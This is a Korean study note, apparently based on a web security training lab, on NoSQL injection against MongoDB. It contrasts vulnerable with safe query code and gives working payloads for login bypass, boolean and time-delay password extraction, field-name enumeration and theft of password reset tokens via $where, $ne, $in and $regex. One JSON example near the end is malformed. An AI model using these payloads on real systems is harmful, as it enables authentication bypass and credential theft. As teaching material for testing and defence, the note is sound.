## NoSQL 인젝션

### NoSQL

전통적인 SQL 관계형 테이블이 아닌 비관계형 데이터베이스들을 통틀어 부르는 카테고리
SQL에 비해 관계적 제약조건과 일관성 검사가 적으며 확장성, 유연성, 성능 측면에서 훨씬 우수함. 

1. 문서 저장소: 가장 대중적인 NoSQL 형태이며 데이터를 **JSON 객체(문서)** 형태로 저장
	- 특징: 저장하는 데이터 항목(필드)이 달라도 에러가 나지 않음. 
	- 대표 DB: MongoDB, CouchDB
	``` json
	{
	  "_id": "user123",
	  "이름": "홍길동",
	  "나이": 25,
	  "취미": ["해킹", "코딩"],
	  "주소": {
	    "도시": "서울",
	    "우편번호": "06000"
	  }
	}
	```

	- 쿼리
		- 정확히 일치하는 값: `db.users.find({"이름": "홍길동"})`
		- 특정 조건: `db.users.find({"나이": {"$gt": 20}})`
		- AND 연산: `db.users.find({"나이": {"$gt": 20}, "도시": "서울"})`
	- 특수 연산자
		- `$eq`: 같음
		- `$ne`: 같지 않음
		- `$gt`: 큼
		- `$lt`: 작음
		- `$in`: 배열 안의 값 중 하나라도 일치함
		- `$where`: 자바스크립트 코드를 직접 실행하여 조건 확인 (가장 위험한 기능 중 하나)
		- `$regex`: 정규 표현식과 일치하는 값을 선택


2. 키-값 스토어: 고유한 키를 찾으면 그에 해당하는 값이 나오는 구조
	- 특징: 구조가 단순해서 매우 빠름. 주로 캐시 목적으로 사용
	- 대표 DB: Redis, DynamoDB
	- 예: `Key: "session_token_9988"`, `Value: "admin_user"`

3. 그래프 데이터베이스: 데이터를 노드(점)와 엣지(선)로 저장. 데이터 자체가 아니라 데이터 간의 관계를 표현하는 데 특화
	- 특징: 'A가 B를 팔로우하고, B는 C를 팔로우하는데, A와 C가 공통으로 아는 사람은?' 같은 복잡한 관계 추적에 강함. 따라서 소셜 네트워크(SNS)나 추천 시스템에 쓰임.
	- 대표 DB: Neo4j
	- 예: `(유저:홍길동) -[친구 맺음]-> (유저:김철수)`

4. 광역 열 기반 스토어: SQL의 테이블과 비슷해 보이지만, 각 행마다 가질 수 있는 컬럼의 개수나 종류가 자유로움. 
	- 특징: 엄청나게 많은 양의 데이터를 여러 서버에 분산해서 저장할 때 유리
	- 대표 DB: Cassandra, HBase


#### MongoDB 구문 주입

문서형 NoSQL의 대표인 MongoDB로 가정 
데이터를 JSON으로 저장하고 데이터베이스 내부에서 데이터를 검색하고 가공할 때 자바스크립트 엔진을 내장해서 쓰는 다른 언어도 동일하게 적용 가능 


해당 URL로 카테고리를 선택해서 요청한다고 가정 
``` url
https://insecure-website.com/product/lookup?category=fizzy
```

만약 서버에서 문자열 결합으로 쿼리에 직접 이어붙이고 `$where`를 사용하는 구조로 코드가 작성된 경우에 가능한 공격
``` js
// 사용자가 입력한 값을 category 변수에 넣음
let category = req.query.category; 

// 🚨 취약점: 입력값을 자바스크립트 코드 구문 안에 문자열로 그대로 이어 붙임
let query = "this.category == '" + category + "'"; 

// MongoDB에 자바스크립트 코드 실행을 요청함
db.products.find({ $where: query });
```

이런 구조인 경우에는 적용이 안됨. 
``` js
// 사용자가 입력한 값을 category 변수에 넣음
let category = req.query.category; 

// ✅ 안전함: 쿼리 로직(객체 구조)과 입력값(데이터)이 완벽히 분리됨
// category가 req.query.category와 동일한 상품만을 찾음. 
db.products.find({ "category": category });
```


### 구문 주입 공격 탐지

#### 입력값이 취약한지 테스트

퍼즈 스트링
``` txt
'"`{
;$Foo}
$Foo \xYZ
```

실행 형태
``` js
db.products.find({ $where: "this.category == ''\"`{ ;$Foo} $Foo \\xYZ'" });
```
- MongoDB처럼 JSON과 자바스크립트 엔진을 사용하는 DB에서 문법 에러가 발생할 건덕지들을 모아둔 것임. 
- 이걸 넣어봄으로써 NoSQL 구문삽입 공격이 가능할지 아닐지 확인할 수 있음.
- URL로 넘어간다면 인코딩, JSON으로 넘어간다면 적절한 JSON 이스케이프를 사용해야함. 


#### 문법 경계선 확인

`'`와 `\'`(이스케이프)를 각각 넣었을때 `'`가 에러가 나고 `\'`가 에러가 나지 않는다면 `$where: "this.category == ' '"` 이런 형태라는 걸 알 수 있고 인젝션 공격에 취약하다는걸 확인할 수 있음. 

``` txt
this.category == '''

this.category == '\''
```


#### 조건부 처리 확인

`fizzy' && 0 && 'x` 와 `fizzy' && 1 && 'x`를 넣어봤을때 

``` js
// 개발자가 짜놓은 취약한 뼈대
this.category == ' [여기에 입력값 들어감] '

// 해커의 입력값이 들어간 후 완성된 완벽한 자바스크립트 코드
this.category == 'fizzy' && 0 && 'x'
```

테스트 1: 거짓(False) 주입 - `fizzy' && 0 && 'x`
- fizzy 카테고리를 눌렀는데, 상품이 하나도 나오지 않고 검색 결과가 없다고 뜸. 

테스트 2: 참(True) 주입 - `fizzy' && 1 && 'x`
- fizzy 카테고리 목록이 정상적으로 뜸. 

만약 테스트1, 2처럼 결과가 나온다면 참/거짓 조건을 조작할 수 있다는 것임. 
예: DB에 질문을 던져서 데이터를 뽑아내기
- `this.category == 'fizzy' && (관리자 비밀번호 첫 글자가 'A'인가?) && 'x'`


#### 기존 조건 무시

`'||'1'=='1`를 넣은 경우에 항상 참이므로 모든 항목을 반환함. 

``` js
this.category == 'fizzy'||'1'=='1'
```


#### 널 문자 사용

URL에 `%00`을 넣고 보내면 널 문자로 인식되어 뒷부분의 조건이 무시됨. 

예시
서버에서 기본적으로 출시된 제품만 보여주기 위해서 `released= == 1` 조건을 붙인다고 가정
이때 널 문자를 사용한 URL을 보내면 
``` url
https://insecure-website.com/product/lookup?category=fizzy'%00
```

다음과 같은 NoSQL 쿼리가 생성돼서 `released` 조건이 무시됨. 
``` js
this.category == 'fizzy'\u0000' && this.released == 1
```


### 구문 주입을 통한 데이터 추출

만약 웹 애플리케이션의 특정 사용자의 역할을 확인하는 요청이 `$where` 연산자가 사용되어 처리된다면 데이터를 추출할 수 있음. 

``` url
https://insecure-website.com/user/lookup?username=admin
```

``` js
// 사용자가 입력한 값을 category 변수에 넣음
let username = req.query.username; 

// 🚨 취약점: 입력값을 자바스크립트 코드 구문 안에 문자열로 그대로 이어 붙임
let query = "this.username == '" + username + "'"; 

// MongoDB에 자바스크립트 코드 실행을 요청함
db.products.find({ $where: query });
```


#### 데이터 추출

`$where` 연산자는 자바스크립트 코드를 실행하기 때문에 이런식으로 URL을 조작하면 민감한 데이터를 추출할 수 있음. 
``` url 
GET /user/lookup?user=administrator' && this.password[0] == 'a' && '1
```

URL 인코딩해야함. 
``` url
GET /user/lookup?user=administrator'+%26%26+this.password[0]+%3d%3d+'a'+%26%26+'1
```


#### 필드 이름 식별

``` url
admin' && this.username!=' 
admin' && this.password!='
```

이렇게 넣어보면 서버 내부에서 `this.username == 'admin' && this.username!=''`가 되는데 
- 해당 필드가 있다면 무조건 `true`가 됨. 
- 해당 필드가 없다면 `this.username`가 `undefined`가 되어 `false`가 됨.

URL 인코딩해야함. 
``` url
GET /user/lookup?username=admin'+%26%26+this.password!%3d'
```


### 시간 지연

에러 메시지에 데이터가 출력되지 않는 경우에 시간지연을 시켜서 참/거짓 판단을 할 수 있음. 

1. `sleep()` 사용
``` js
admin' + (this.password[0] === 'a' && sleep(5000)) + '
```

2. 즉시 실행 함수 + `sleep()` 사용
``` js
admin' + function(x){ if(x.password[0]==='a') sleep(5000); }(this) + '
```

3. 즉시 실행 함수 + `while` 사용: `sleep()` 함수 미지원 환경 대비
``` js
admin'+function(x){
  var waitTill = new Date(new Date().getTime() + 5000);
  while((x.password[0] === "a") && waitTill > new Date()){};
}(this)+'
```
- `function(x){...}(this)`: 자바스크립트의 즉시 실행 함수. 현재 문서 객체인 `this`를 매개변수 `x`로 전달
- `x.password[0] === "a"`: 비밀번호의 첫 번째 글자가 `'a'`인지 검사



#### MongoDB 연산자 주입

이런 구조의 코드에서 적용이 가능함. 
``` js
// 사용자가 입력한 값을 category 변수에 넣음
let category = req.query.category; 

// ✅ 안전함: 쿼리 로직(객체 구조)과 입력값(데이터)이 완벽히 분리됨
// category가 req.query.category와 동일한 상품만을 찾음. 
db.products.find({ "category": category });
```

- `$where` – 자바스크립트 표현식을 만족하는 경우
- `$ne` – 지정된 값과 같지 않은 모든 값
	- 예: `"password": {"$ne":""}`
- `$in` – 배열에 지정된 모든 값
	- 예: `"username":{"$in":["admin","administrator","superadmin"]}`
- `$regex` – 지정된 정규 표현식과 일치하는 값
	- 예: `"username":{"$regex": "^admin"}`



### 연산자 주입 공격

1. **JSON 방식으로 공격하는 경우**
``` json
// 정상 요청
{"username": "wiener"}

// 해커의 조작된 요청
{"username": {"$ne": "invalid"}}

{
	"username": {"$in":["admin","administrator","superadmin"]},
	"password": {"$ne":""}
}
```
- `username`이 `invalid`인 사람은 없으므로 무조건 참이 됨. 

2. **URL 파라미터 방식으로 공격하는 경우**
``` url
// 정상 요청
https://example.com/login?username=wiener

// 해커의 조작된 요청
https://example.com/login?username[$ne]=invalid
```
- Node.js나 PHP 같은 서버 백엔드는 URL에 `username[$ne]=invalid`라고 적어서 보내면, 내부적으로 **`{"username": {"$ne": "invalid"}}` 라는 JSON 형태로 변환**해서 처리하는 특징이 있음.

3. **URL 공격이 막힌 경우**: 만약 서버가 URL 방식의 공격(`username[$ne]`)을 눈치채고 차단하거나 에러를 낸다면, 2번 방식에서 1번 방식으로 바꿔서 요청을 시도해봄. 
	1. 요청 방식 변경: `GET` ➔ `POST`
	2. 데이터 종류 속이기: `Content-Type: application/x-www-form-urlencoded` ➔ `Content-Type: application/json`으로 변경
	3. 바디에 공격 코드 작성: URL 파라미터 대신, 본문에 직접 1번에서 만든 악성 JSON을 집어넣어 서버로 전송
	- 참고: 서버에서 라우팅 설정이 느슨하게 되어있어 해당 엔드포인트에서 POST 요청이 가능해야함. 



### 연산자 주입을 통한 데이터 추출 

정상 요청 
``` json
{"username":"wiener","password":"peter"}
```

해커의 조작된 요청: `$where` 연산자를 추가적인 매개변수로 추가
``` json
{"username":"wiener","password":"peter", "$where":"0"}
{"username":"wiener","password":"peter", "$where":"1"}
```
- 거짓이 되는 요청과 참이 되는 요청을 각각 보냈을때, 두 응답 값에 차이가 있다면 `$where`이 서버에서 처리되고 있음을 알 수 있음. 


#### 필드 이름 추출

``` json
{ "$where":"Object.keys(this)[0].match('^.{0}a.*')" }
```

- `this`: `$where` 조건절 안에서 현재 검사 중인 **MongoDB 문서(Document) 객체 전체**
	- 예: `{ _id: "123", username: "wiener", password: "peter" }`
- `Object.keys(...)`: 객체가 가지고 있는 모든 키들을 배열 형태로 뽑아내는 자바스크립트 표준 함수
	- 예: `Object.keys(this)` $\rightarrow$ `["_id", "username", "password"]`
- `match('^.{0}a.*')`: 0번째 자리가 문자 a로 시작하는지 검사

#### 데이터 추출

1. 요청에 추출하려는 데이터 필드가 있는 경우: `$regex` 연산자 사용
``` json
// 정상 요청: 비밀번호 틀림. 
{"username":"myuser","password":"mypass"}

// 해커의 조작된 요청
{"username":"admin","password":{"$regex":"^.*"}}
```
- 조작된 요청이 로그인 성공하거나 비밀번호가 틀렸을때와 다른 응답이 온다면 `$regex`가 서버에서 처리되고 있다는 것임. 
- 해당 요청으로 데이터를 추출 가능. 
``` json
{"username":"admin","password":{"$regex":"^a.*"}}
```


2. 요청에 추출하려는 데이터 필드가 없는 경우: `$where` 연산자 사용
``` json
// pwResetToken 데이터 추출 가능
{ 
	"username":"carlos",
	"password":{"$ne": "invalid"},
	"$where":"this['pwResetToken'].match('^.{0}a.*')"
}
```


#### 예시

비밀번호 재설정 요청을 보내면 서버에서 해당 사용자 DB에 비밀번호 재설정 토큰을 생성해서 저장함. 
1. 필드 이름 추출: 해당 요청에서 필드의 위치 `[i]`를 바꿔가면서 찾아봄. 
``` json
{
	"username":"carlos",
	"password":{"$ne": "invalid"},
	{ "$where":"Object.keys(this)[2].match('^.{0}a.*')" }
}
```

2. 데이터 추출: 필드 이름이 `pwResetToken`라고 가정하면 해당 요청을 날려서 데이터 추출
``` json
{ 
	"username":"carlos",
	"password":{"$ne": "invalid"},
	"$where":"this['pwResetToken'].match('^.{0}a.*')"
	// this.pwResetToken.match('^.{0}a.*')도 가능 
}
```

3. 비밀번호 재설정 토큰을 이용하여 재설정 페이지에 접근
	- 프론트엔트 JS 소스코드를 분석하거나 웹 프레임워크 관례처럼 자주 사용하는 경로나 쿼리 파라미터 키 이름을 추측해서 여러개 넣으면서 찾기. 
	- `/forgot-password?pwResetToken={토큰값}` 처럼 필드 이름과 경로가 일치하는 경우도 있음.  


### 시간 지연

에러 메시지에 데이터가 출력되지 않는 경우에 시간지연을 시켜서 참/거짓 판단을 할 수 있음. 
JSON 본문 전체나 쿼리 파라미터를 조작하여 **쿼리 객체의 최상위에 `$where` 연산자 항목을 새로 추가할 수 있는 경우**에만 사용 가능.

1. `sleep()` 사용
``` json
{
  "category": "electronics",
  "$where": "this.password[0] === 'a' && sleep(5000)"
}
```

2. 즉시 실행 함수 + `sleep()` 사용
``` json 
{
  "category": "electronics",
  "$where": "function(x){ if(x.password[0]==='a') { sleep(5000); } return true; }(this)"
}
```

3. 즉시 실행 함수 + `while` 사용: `sleep()` 함수 미지원 환경 대비
``` json
{
  "category": "electronics",
  "$where": "function(x){ var t = new Date().getTime() + 5000; while(x.password[0] === 'a' && new Date().getTime() < t){}; return true; }(this)"
}
```

